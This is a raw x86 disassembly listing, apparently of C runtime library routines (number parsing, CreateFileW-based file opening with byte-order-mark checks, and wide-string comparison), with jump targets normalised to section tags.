mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1003c23b ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1003dfe2
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_1003c26b
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_1003d156
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_1002d4ee
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1002d4db
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_1003a12f
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1002d4ee
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1002d4db
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_1002d4db
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1002d501
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1002d501
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_10039eea
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_100328fc
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_1003377b
add esp 0xc
test eax eax
jne r-xdata
call sub_1002d4ee
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_100328fc
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1003317d
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1002d501
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_10039f6b
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_1003cee4
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_1003377b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100389d2
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100389d2
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1003317d
pop ecx
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_100328fc
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_100326ac
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_100328fc
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_100389d2
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100389d2
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_1003c98b
push 0x14
push r--data
call sub_1002fdfc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_1002d4db
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_1002fe41
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_1003c26b
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003ca29
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_1003ca29
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_1003a108
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1003ca57
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1003c98b
add esp 0x18
pop ebp
retn
sub_1003ca77
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_1003e1b0
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_1003e1b0
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_1003cb61
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ca77
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_1003cc07
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
